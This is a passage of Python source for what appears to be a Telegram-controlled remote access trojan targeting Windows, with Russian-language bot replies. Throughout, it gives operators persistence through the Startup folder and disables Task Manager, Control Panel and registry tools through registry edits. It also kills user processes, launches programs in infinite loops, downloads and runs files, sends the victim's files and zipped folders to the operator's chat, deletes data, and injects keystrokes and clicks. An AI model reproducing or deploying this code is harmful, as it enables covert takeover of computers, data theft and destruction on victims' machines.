                    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*start.vbs* уже находится в автозагрузке!', parse_mode="Markdown")
                  else:
                    shutil.copy2("C:\\ProgramData\\Files\\start.vbs", path)
                    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*start.vbs* скопирован в автозагрузку!', parse_mode="Markdown")
                except PermissionError:
                    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Недостаточно прав*', parse_mode="Markdown")
                except:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Ошибка*', parse_mode="Markdown")

            if call.data == 'uninstall':
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Вы уверены?*', reply_markup=main12, parse_mode="Markdown")

            if call.data == 'confirm':
                try:
                    path = 'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
                    if os.path.exists(path + "start.vbs"):
                        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*start.vbs* не в автозагрузке!', parse_mode="Markdown")
                    os.remove(path + 'start.vbs')
                    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*start.vbs* удален из автозагрузки!', parse_mode="Markdown")
                except:
                    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Ошибка*', parse_mode="Markdown")

            if call.data == 'taskkill all':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Останавливаем...*', parse_mode="Markdown")
                  directory = 'C:\\ProgramData\\'
                  with open(os.path.join(directory, 'taskkill.bat'), 'w') as OPATH:
                      OPATH.writelines(['if "%~1"=="" (set "x=%~f0"& start "" /min "%comspec%" /v/c "!x!" any_word & exit /b)\n',
                                        'taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne ' + os.path.basename(sys.argv[0])])
                  os.startfile('C:\\ProgramData\\taskkill.bat')
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Все процессы остановлены!*', parse_mode="Markdown")
                except:
                  pass

            if call.data == 'disabletaskmgr':
                try:
                  directory = 'C:\\ProgramData\\'
                  with open(os.path.join(directory, 'regedit.bat'), 'w') as OPATH:
                      OPATH.writelines(['reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f\n',
                                        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f\n',
                                        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f'])
                  os.startfile('C:\\ProgramData\\regedit.bat', 'runas')
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Диспетчер задач отключен!*', parse_mode="Markdown")
                except OSError:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Отказано в доступе*', parse_mode="Markdown")
                except:
                  bot.send_message(message.chat.id, '*Ошибка*', parse_mode="Markdown")

            if call.data == 'enabletaskmgr':
                try:
                  directory = 'C:\\ProgramData\\'
                  with open(os.path.join(directory, 'regedit.bat'), 'w') as OPATH:
                      OPATH.writelines(['reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 0 /f\n',
                                        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 0 /f\n',
                                        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 0 /f'])
                  os.startfile('C:\\ProgramData\\regedit.bat', 'runas')
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Диспетчер задач включён!*', parse_mode="Markdown")
                except OSError:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Отказано в доступе*', parse_mode="Markdown")
                except:
                  bot.send_message(message.chat.id, '*Ошибка*', parse_mode="Markdown")

            if call.data == 'startfile':
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Выберите программу*', reply_markup=main10, parse_mode="Markdown")

            if call.data == 'chrome':
                try:
                  os.startfile('chrome.exe')
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Chrome открыт!*', parse_mode="Markdown")
                except:
                  pass

            if call.data == 'explorer':
                try:
                  os.startfile('explorer.exe')
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Explorer открыт!*', parse_mode="Markdown")
                except:
                  pass

            if call.data == 'paint':
                try:
                  os.startfile('mspaint.exe')
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Paint открыт!*', parse_mode="Markdown")
                except:
                  pass

            if call.data == 'cmd':
                try:
                  os.startfile('cmd.exe')
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*CMD открыт!*', parse_mode="Markdown")
                except:
                  pass

            if call.data == 'infinityopen':
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Выберите программу*', reply_markup=main11, parse_mode="Markdown")

            if call.data == 'infchrome':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Chrome открыт!*', parse_mode="Markdown")
                  while True:
                    os.startfile('chrome.exe')
                except:
                  pass

            if call.data == 'infexplorer':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Explorer открыт!*', parse_mode="Markdown")
                  while True:
                    os.startfile('explorer.exe')
                except:
                  pass

            if call.data == 'infpaint':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Paint открыт!*', parse_mode="Markdown")
                  while True:
                    os.startfile('mspaint.exe')
                except:
                  pass

            if call.data == 'infcmd':
                try:
                  bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*CMD открыт!*', parse_mode="Markdown")
                  while True:
                    os.startfile('cmd.exe')
                except:
                  pass

            if call.data == 'back':
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Выберите параметр*', reply_markup=main9, parse_mode="Markdown")

            if call.data == 'cancel':
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='`...`', parse_mode="Markdown")

@bot.message_handler(commands=['Files', 'files'])
def files(command):
    if command.chat.id in adm:
        bot.send_chat_action(command.chat.id, 'typing')
        bot.send_message(command.chat.id, '`...`', reply_markup=main7, parse_mode="Markdown")

@bot.message_handler(commands=['Keyboard', 'keyboard'])
def keyboard(command):
    if command.chat.id in adm:
        bot.send_chat_action(command.chat.id, 'typing')
        bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main14, parse_mode="Markdown")

@bot.message_handler(commands=['Restart', 'restart'])
def restart(command):
    if command.chat.id in adm:
        try:
            bot.send_message(command.chat.id, '*Скрипт перезагружен*', parse_mode="Markdown")
            stoper = 0
            try:
                os.startfile('C:\\ProgramData\\Files\\start.vbs')
            except:
                try:
                    os.startfile(
                        'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.vbs')
                except:
                    stoper = 1
            if stoper == 0:
                os.system('taskkill /f /im py.exe')
                exit()
        except:
            pass

@bot.message_handler(commands=['Combination', 'combination', 'Comb', 'comb'])
def combination(message):
    if message.chat.id in adm:
        try:
            bot.send_chat_action(message.chat.id, 'typing')
            if len(message.text.split()) == 1 or message.text.split()[1] == "⌨️":
                bot.send_message(message.chat.id, "*Напишите комбинацию/клавишу\n\n• /Combination*", parse_mode="Markdown")
            elif len(message.text.split()) == 2:
                pyautogui.hotkey(message.text.split()[1])
                bot.send_message(message.chat.id, f"Клавиша *{message.text.split()[1]}* нажата", parse_mode="Markdown")
            elif len(message.text.split()) == 3:
                print(message.text.split()[1], message.text.split()[2], message.text.split())
                pyautogui.hotkey(message.text.split()[1], message.text.split()[2])
                bot.send_message(message.chat.id, f"Комбинация *{message.text.split()[1]} + {message.text.split()[2]}* нажата", parse_mode="Markdown")
            elif len(message.text.split()) == 4:
                pyautogui.hotkey(message.text.split()[1], message.text.split()[2], message.text.split()[3])
                bot.send_message(message.chat.id, f"Комбинация *{message.text.split()[1]} + {message.text.split()[2]} + {message.text.split()[3]}* нажата", parse_mode="Markdown")
            elif len(message.text.split()) == 5:
                pyautogui.hotkey(message.text.split()[1], message.text.split()[2], message.text.split()[3], message.text.split()[4])
                bot.send_message(message.chat.id, f"Комбинация *{message.text.split()[1]} + {message.text.split()[2]} + {message.text.split()[3]} + {message.text.split()[4]}* нажата", parse_mode="Markdown")
            else:
                bot.send_message(message.chat.id, "*Ошибка*", parse_mode="Markdown")
        except:
            bot.send_message(message.chat.id, "*Ошибка*", parse_mode="Markdown")

@bot.message_handler(commands=['Printtext', 'printtext', 'Pt', 'pt'])
def printtext(message):
    if message.chat.id in adm:
        try:
            bot.send_chat_action(message.chat.id, 'typing')
            if len(message.text.split()) == 1 or message.text.split()[1] == "⌨️":
                bot.send_message(message.chat.id, "*Напишите текст\n\n• /Printtext*", parse_mode="Markdown")
            else:
                pyautogui.typewrite(message.text.split(maxsplit=1)[1])
        except Exception as e:
            print(e)
            bot.send_message(message.chat.id, "*Ошибка*", parse_mode="Markdown")



@bot.message_handler(commands=['CD'])
def cd(message):
    if message.chat.id in adm:
        try:
            bot.send_chat_action(message.chat.id, 'typing')
            user_msg = "{0}".format(message.text)
            os.chdir(user_msg.split("/CD ")[1])
            bot.send_message(message.chat.id, '*Директория изменена*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
        except FileNotFoundError:
            bot.send_message(message.chat.id, '*Директория не найдена*', parse_mode="Markdown")
        except:
            bot.send_message(message.chat.id, '*Текущая директория*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")

@bot.message_handler(commands=['cd'])
def cd(message):
    if message.chat.id in adm:
        try:
            bot.send_chat_action(message.chat.id, 'typing')
            user_msg = "{0}".format(message.text)
            os.chdir(user_msg.split("/cd ")[1])
            bot.send_message(message.chat.id, '*Директория изменена*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
        except FileNotFoundError:
            bot.send_message(message.chat.id, '*Директория не найдена*', parse_mode="Markdown")
        except:
            bot.send_message(message.chat.id, '*Текущая директория*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")

@bot.message_handler(commands=['Delete'])
def delete(message):
    if message.chat.id in adm:
        try:
            bot.send_chat_action(message.chat.id, 'typing')
            user_msg = "{0}".format(message.text)
            created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/Delete ")[1])
            year, month, day, hour, minute, second = time.localtime(created)[:-3]

            def convert_bytes(num):
                for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
                    if num < 1024.0:
                        return "%3.1f %s" % (num, x)
                    num /= 1024.0

            def file_size(file_path):
                if os.path.isfile(file_path):
                    file_info = os.stat(file_path)
                    return convert_bytes(file_info.st_size)

            bot.send_message(message.chat.id,
                             'Файл *' + user_msg.split("/Delete ")[1] + '* удален!'
                                                                        '\n'
                                                                        '\nСоздан » %02d/%02d/%d' % (day, month, year) +
                             '\nРазмер » ' + file_size(os.getcwd() + '\\' + user_msg.split("/Delete ")[1]),
                             parse_mode="Markdown")
            os.remove(os.getcwd() + '\\' + user_msg.split("/Delete ")[1])
        except:
            try:
                bot.send_chat_action(message.chat.id, 'typing')
                created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/Delete ")[1])
                year, month, day, hour, minute, second = time.localtime(created)[:-3]
                folder = os.getcwd() + '\\' + user_msg.split("/Delete ")[1]
                folder_size = 0
                for (path, dirs, files) in os.walk(folder):
                    for file in files:
                        filename = os.path.join(path, file)
                        folder_size += os.path.getsize(filename)
                files = folders = 0
                for _, dirnames, filenames in os.walk(os.getcwd() + '\\' + user_msg.split("/Delete ")[1]):
                    files += len(filenames)
                    folders += len(dirnames)
                shutil.rmtree(os.getcwd() + '\\' + user_msg.split("/Delete ")[1])
                bot.send_message(message.chat.id,
                                 'Папка *' + user_msg.split("/Delete ")[1] + '* удалена!'
                                                                             '\n'
                                                                             '\nСоздана » %02d/%02d/%d' % (
                                 day, month, year) +
                                 '\nРазмер » %0.1f MB' % (folder_size / (1024 * 1024.0)) +
                                 '\nСодержало » ' + "{:,} Файлов, {:,} Папок".format(files, folders),
                                 parse_mode="Markdown")
            except FileNotFoundError:
                bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
            except PermissionError:
                bot.send_message(message.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
            except:
                bot.send_message(message.chat.id, '*Введите название файла\n \n• /Delete*', parse_mode="Markdown")

@bot.message_handler(commands=['delete'])
def delete(message):
    if message.chat.id in adm:
        try:
            bot.send_chat_action(message.chat.id, 'typing')
            user_msg = "{0}".format(message.text)
            created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/delete ")[1])
            year, month, day, hour, minute, second = time.localtime(created)[:-3]

            def convert_bytes(num):
                for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
                    if num < 1024.0:
                        return "%3.1f %s" % (num, x)
                    num /= 1024.0

            def file_size(file_path):
                if os.path.isfile(file_path):
                    file_info = os.stat(file_path)
                    return convert_bytes(file_info.st_size)

            bot.send_message(message.chat.id,
                             'Файл *' + user_msg.split("/delete ")[1] + '* удален!'
                                                                        '\n'
                                                                        '\nСоздан » %02d/%02d/%d' % (day, month, year) +
                             '\nРазмер » ' + file_size(os.getcwd() + '\\' + user_msg.split("/delete ")[1]),
                             parse_mode="Markdown")
            os.remove(os.getcwd() + '\\' + user_msg.split("/delete ")[1])
        except:
            try:
                bot.send_chat_action(message.chat.id, 'typing')
                created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/delete ")[1])
                year, month, day, hour, minute, second = time.localtime(created)[:-3]
                folder = os.getcwd() + '\\' + user_msg.split("/delete ")[1]
                folder_size = 0
                for (path, dirs, files) in os.walk(folder):
                    for file in files:
                        filename = os.path.join(path, file)
                        folder_size += os.path.getsize(filename)
                files = folders = 0
                for _, dirnames, filenames in os.walk(os.getcwd() + '\\' + user_msg.split("/delete ")[1]):
                    files += len(filenames)
                    folders += len(dirnames)
                shutil.rmtree(os.getcwd() + '\\' + user_msg.split("/delete ")[1])
                bot.send_message(message.chat.id,
                                 'Папка *' + user_msg.split("/delete ")[1] + '* удалена!'
                                                                             '\n'
                                                                             '\nСоздана » %02d/%02d/%d' % (
                                 day, month, year) +
                                 '\nРазмер » %0.1f MB' % (folder_size / (1024 * 1024.0)) +
                                 '\nСодержало » ' + "{:,} Файлов, {:,} Папок".format(files, folders),
                                 parse_mode="Markdown")
            except FileNotFoundError:
                bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
            except PermissionError:
                bot.send_message(message.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
            except:
                bot.send_message(message.chat.id, '*Введите название файла\n \n• /Delete*', parse_mode="Markdown")

@bot.message_handler(commands=['Upload', 'upload'])
def upload(message):
    if message.chat.id in adm:
        try:
            user_msg = "{0}".format(message.text)
            url = user_msg.split(" ")[1]
            req = urllib.request.Request(url, method='HEAD')
            r = urllib.request.urlopen(req)
            file_name = 'C:\\ProgramData\\Files\\' + r.info().get_filename()
            bot.send_message(message.chat.id, '*Скачиваем файл...*', parse_mode="Markdown")
            urllib.request.urlretrieve(url, file_name)
            bot.reply_to(message, '*Файл загружен на компьютер!*\n \n`' + file_name + '`', parse_mode="Markdown")
        except urllib.error.HTTPError as err:
            bot.send_message(message.chat.id, '*Ссылка не найдена*', parse_mode="Markdown")
        except ValueError:
            bot.send_message(message.chat.id, '*Вставьте рабочую ссылку*', parse_mode="Markdown")
        except:
            bot.send_message(message.chat.id, '*Отправьте файл или вставьте URL-Ссылку\n \n• /Upload*',
                             parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def document(message):
    if message.chat.id in adm:
        try:
            file_info = bot.get_file(message.document.file_id)
            bot.send_message(message.chat.id, '*Скачиваем...*', parse_mode="Markdown")
            downloaded_file = bot.download_file(file_info.file_path)
            src = 'C:\\ProgramData\\Files\\' + file_info.file_path;
            with open(src, 'wb') as new_file:
                new_file.write(downloaded_file)
            bot.reply_to(message,
                         '*Файл загружен на компьютер!*\n \n`C:/ProgramData/Files/' + file_info.file_path + '`',
                         parse_mode="Markdown")
        except FileNotFoundError:
            bot.reply_to(message, '*Формат файла не поддерживается*', parse_mode="Markdown")
        except:
            bot.reply_to(message, '*Не удалось загрузить файл*', parse_mode="Markdown")

@bot.message_handler(commands=['Download'])
def download(message):
    if message.chat.id in adm:
        try:
            user_msg = "{0}".format(message.text)
            download = open(os.getcwd() + '\\' + user_msg.split("/Download ")[1], 'rb')
            bot.send_message(message.chat.id, '*Отправляем...*', parse_mode="Markdown")
            bot.send_chat_action(message.chat.id, 'upload_document')
            bot.send_document(message.chat.id, download)
        except FileNotFoundError:
            bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
        except:
            try:
                bot.send_message(message.chat.id, '*Собираем...*', parse_mode="Markdown")
                shutil.make_archive('C:\\ProgramData\\' + user_msg.split("/Download ")[1],
                                    'zip',
                                    os.getcwd(),
                                    user_msg.split("/Download ")[1])
                bot.send_chat_action(message.chat.id, 'upload_document')
                file = open('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip', 'rb')
                bot.send_message(message.chat.id, '*Отправляем...*', parse_mode="Markdown")
                bot.send_document(message.chat.id, file)
                file.close()
                os.remove('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip')
            except:
                try:
                    file.close()
                    os.remove('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip')
                    bot.send_message(message.chat.id, '*Вы не можете скачать файл больше 50МБ*', parse_mode="Markdown")
                except:
                    bot.send_message(message.chat.id, '*Введите название файла\n \n• /Download*', parse_mode="Markdown")

@bot.message_handler(commands=['download'])
def download(message):
    if message.chat.id in adm:
        try:
            user_msg = "{0}".format(message.text)
            download = open(os.getcwd() + '\\' + user_msg.split("/download ")[1], 'rb')
            bot.send_message(message.chat.id, '*Отправляем...*', parse_mode="Markdown")
            bot.send_chat_action(message.chat.id, 'upload_document')
            bot.send_document(message.chat.id, download)
        except FileNotFoundError:
            bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
        except:
            try:
                bot.send_message(message.chat.id, '*Собираем...*', parse_mode="Markdown")
                shutil.make_archive('C:\\ProgramData\\' + user_msg.split("/download ")[1],
                                    'zip',
                                    os.getcwd(),
                                    user_msg.split("/download ")[1])
                bot.send_chat_action(message.chat.id, 'upload_document')
                file = open('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip', 'rb')
                bot.send_message(message.chat.id, '*Отправляем...*', parse_mode="Markdown")
                bot.send_document(message.chat.id, file)
                file.close()
                os.remove('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip')
            except:
                try:
                    file.close()
                    os.remove('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip')
                    bot.send_message(message.chat.id, '*Вы не можете скачать файл больше 50МБ*', parse_mode="Markdown")
                except:
                    bot.send_message(message.chat.id, '*Введите название файла\n \n• /Download*', parse_mode="Markdown")

@bot.message_handler(commands=['Run'])
def run(message):
    if message.chat.id in adm:
        try:
            bot.send_chat_action(message.chat.id, 'typing')
            user_msg = "{0}".format(message.text)
            os.startfile(os.getcwd() + '\\' + user_msg.split("/Run ")[1])
            bot.send_message(message.chat.id, 'Файл *' + user_msg.split("/Run ")[1] + '* открыт!',
                             parse_mode="Markdown")
        except FileNotFoundError:
            bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
        except:
            bot.send_message(message.chat.id, '*Введите название файла*\n \n• /Run', parse_mode="Markdown")

@bot.message_handler(commands=['run'])
def run(message):
    if message.chat.id in adm:
        try:
            bot.send_chat_action(message.chat.id, 'typing')
            user_msg = "{0}".format(message.text)
            os.startfile(os.getcwd() + '\\' + user_msg.split("/run ")[1])
            bot.send_message(message.chat.id, 'Файл *' + user_msg.split("/run ")[1] + '* открыт!',
                             parse_mode="Markdown")
        except FileNotFoundError:
            bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
        except:
            bot.send_message(message.chat.id, '*Введите название файла*\n \n• /Run', parse_mode="Markdown")

@bot.message_handler(commands=['PWD', 'pwd'])
def pwd(command):
    if command.chat.id in adm:
        try:
            bot.send_chat_action(command.chat.id, 'typing')
            dirs = '\n``'.join(os.listdir(path="."))
            bot.send_message(command.chat.id, '`' + os.getcwd() + '`\n \n' + '`' + dirs + '`', parse_mode="Markdown")
        except:
            try:
                bot.send_chat_action(command.chat.id, 'typing')
                dirse = '\n'.join(os.listdir(path="."))
                splitted_text = util.split_string(dirse, 4096)
                for dirse in splitted_text:
                    bot.send_message(command.chat.id, '`' + dirse + '`', parse_mode="Markdown")
            except:
                pass

@bot.message_handler(commands=['Cancel', 'cancel'])
def cancelfiles(command):
    if command.chat.id in adm:
        bot.send_chat_action(command.chat.id, 'typing')
        bot.send_message(command.chat.id, '`...`', reply_markup=main6, parse_mode="Markdown")

@bot.message_handler(commands=['Cancel3', 'cancel3'])
def cancelfiles(command):
    if command.chat.id in adm:
        bot.send_chat_action(command.chat.id, 'typing')
        bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode="Markdown")

@bot.message_handler(commands=['Tasklist', 'tasklist'])
def tasklist(command):
    if command.chat.id in adm:
        try:
            bot.send_chat_action(command.chat.id, 'upload_document')
            os.system('tasklist>  C:\\ProgramData\\Tasklist.txt')
            tasklist = open('C:\\ProgramData\\Tasklist.txt')
            bot.send_document(command.chat.id, tasklist)
            tasklist.close()
            os.remove('C:\\ProgramData\\Tasklist.txt')
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt",
                       "a")
            log.write(
                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({command.chat.id}) {command.chat.username} Написал - {command.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass

@bot.message_handler(commands=['Taskkill', 'taskkill'])
def taskkill(message):
    if message.chat.id in adm:
        try:
            bot.send_chat_action(message.chat.id, 'typing')
            user_msg = "{0}".format(message.text)
            os.system("taskkill /f /im  " + user_msg.split(" ")[1])
            bot.send_message(message.chat.id, "Процесс *" + user_msg.split(" ")[1] + "* остановлен!",
                             parse_mode="Markdown")
        except:
            bot.send_message(message.chat.id,
                             '*Введите название процесса'
                             '\n'
                             '\n• /Taskkill*'
                             '\n'
                             '\n*Активное окно*'
                             '\n'
                             '\n`' + GetWindowText(GetForegroundWindow()) + '`',
                             reply_markup=main13, parse_mode="Markdown")

@bot.message_handler(commands=['Message'])
def message(message):
    if message.chat.id in adm:
        try:
            bot.send_chat_action(message.chat.id, 'typing')
            user_msg = "{0}".format(message.text)
            ctypes.windll.user32.MessageBoxW(0, user_msg.split("/Message ")[1], u'Information', 0x10)
            bot.reply_to(message, '*Сообщение отправленно!*', parse_mode="Markdown")
        except:
            bot.send_message(message.chat.id, '*Введите сообщение\n \n• /Message*', parse_mode="Markdown")

@bot.message_handler(commands=['message'])
def message(message):
    if message.chat.id in adm:
        try:
            bot.send_chat_action(message.chat.id, 'typing')
            user_msg = "{0}".format(message.text)
            ctypes.windll.user32.MessageBoxW(0, user_msg.split("/message ")[1], u'Information', 0x10)
            bot.reply_to(message, '*Сообщение отправленно!*', parse_mode="Markdown")
        except:
            bot.send_message(message.chat.id, '*Введите сообщение\n \n• /Message*', parse_mode="Markdown")

@bot.message_handler(commands=['OpenURL', 'openurl'])
def openurl(message):
    if message.chat.id in adm:
        try:
            bot.send_chat_action(message.chat.id, 'typing')
            user_msg = "{0}".format(message.text)
            url = user_msg.split(" ")[1]
            webbrowser.open_new_tab(url)
            bot.reply_to(message, '*Ссылка открыта!*', parse_mode="Markdown")
        except:
            bot.send_message(message.chat.id, '*Вставьте ссылку\n \n• /OpenURL*', parse_mode="Markdown")

@bot.message_handler(commands=['Wallpapers', 'wallpapers'])
def wallpapers(command):
    if command.chat.id in adm:
        bot.send_message(command.chat.id, '*Отправьте фотографию*', parse_mode="Markdown")

@bot.message_handler(content_types=['photo'])
def wallpapers(message):
    if message.chat.id in adm:
        try:
            file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            src = 'C:\\ProgramData\\Files\\' + file_info.file_path;
            with open(src, 'wb') as new_file:
                new_file.write(downloaded_file)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, 'C:\\ProgramData\\Files\\' + file_info.file_path, 0)
            bot.reply_to(message, '*Фотография установлена на обои!*', parse_mode="Markdown")
            time.sleep(3)
            os.remove('C:\\ProgramData\\Files\\' + file_info.file_path)
        except:
            bot.reply_to(message, '*Не удалось загрузить фотографию*', reply_markup=menu, parse_mode="Markdown")

@bot.message_handler(commands=['Voice', 'voice'])
def voice(command):
    if command.chat.id in adm:
        bot.send_message(command.chat.id, '*Введите текст\n \n• /Say*', parse_mode="Markdown")

@bot.message_handler(commands=['Say'])
def say(message):
    if message.chat.id in adm:
        try:
            from win32com.client import constants, Dispatch
            bot.reply_to(message, '*Воспроизводим...*', parse_mode="Markdown")
            user_msg = "{0}".format(message.text)
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
                IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevel(-0.0, None)
            speaker = Dispatch("SAPI.SpVoice")
            speaker.Speak(user_msg.split("/Say")[1])
            del speaker
            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt",
                       "a")
            log.write(
                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass

@bot.message_handler(commands=['say'])
def say(message):
    if message.chat.id in adm:
        try:
            from win32com.client import constants, Dispatch
            bot.reply_to(message, '*Воспроизводим...*', parse_mode="Markdown")
            user_msg = "{0}".format(message.text)
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
                IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevel(-0.0, None)
            speaker = Dispatch("SAPI.SpVoice")
            speaker.Speak(user_msg.split("/say")[1])
            del speaker
            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt",
                       "a")
            log.write(
                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass


@bot.message_handler(commands=['Mouse', 'mouse'])
def mouse(message):
    if message.chat.id in adm:
        try:
            bot.send_message(message.chat.id, '. . .', parse_mode="Markdown", reply_markup=main15)
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt",
                       "a")
            log.write(
                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass


@bot.message_handler(commands=['LeftClick', 'leftclick', 'click', 'Click', 'lc'])
def leftclick(message):
    if message.chat.id in adm:
        try:
            pyautogui.leftClick()
            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
